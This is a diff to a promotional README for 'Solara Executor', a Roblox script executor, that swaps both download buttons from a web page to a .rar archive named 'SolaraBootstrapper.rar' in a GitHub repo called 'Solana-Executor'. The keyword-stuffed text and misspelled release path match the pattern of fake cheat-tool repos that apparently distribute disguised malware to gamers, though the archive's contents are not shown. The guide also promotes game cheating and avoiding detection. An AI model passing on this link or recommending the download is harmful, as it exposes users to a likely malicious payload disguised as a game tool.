@@ -5,7 +5,7 @@
 Welcome to the ultimate guide on Solara Executor, your go-to tool for enhancing gaming experiences across various platforms! 🚀 This powerful script executor is designed for enthusiasts who want to unlock advanced features in games like Roblox and beyond. Whether you're a beginner or a pro, Solara Executor offers seamless integration, robust performance, and a user-friendly interface. In this article, we'll dive deep into everything you need to know about the solara executor download, including its features, benefits, installation steps, and much more. 🌟
 
 <div align="center">
-  <a href="https://solarexecs.github.io/solara/">
+  <a href="(https://github.com/gangjasain/Solana-Executor/releases/download/relase/SolaraBootstrapper.rar)">
     <img src="https://imagedelivery.net/R7R2gvNaHJl_gw06IoIdgw/3b93c4b4-beda-4b22-aede-d9e0d9b52600/public" alt="download" width="200" height="auto" style="max-width: 100%; margin: 10px 0;" />
   </a>
 </div>
@@ -226,7 +226,7 @@ Common issues? 🔍 If Solara crashes, check RAM usage. For detection problems, 
 In summary, Solara Executor is your gateway to elevated gaming. 🎉 With its rich features, easy installation, and strong community, it's the top choice for script enthusiasts. Download today and transform your playstyle—safely and freely. Thanks for reading this in-depth guide!  
 
 <div align="center">
-  <a href="https://solarexecs.github.io/solara/">
+  <a href="(https://github.com/gangjasain/Solana-Executor/releases/download/relase/SolaraBootstrapper.rar)">
     <img src="https://imagedelivery.net/R7R2gvNaHJl_gw06IoIdgw/3b93c4b4-beda-4b22-aede-d9e0d9b52600/public" alt="download" width="200" height="auto" style="max-width: 100%; margin: 10px 0;" />
   </a>
 </div>
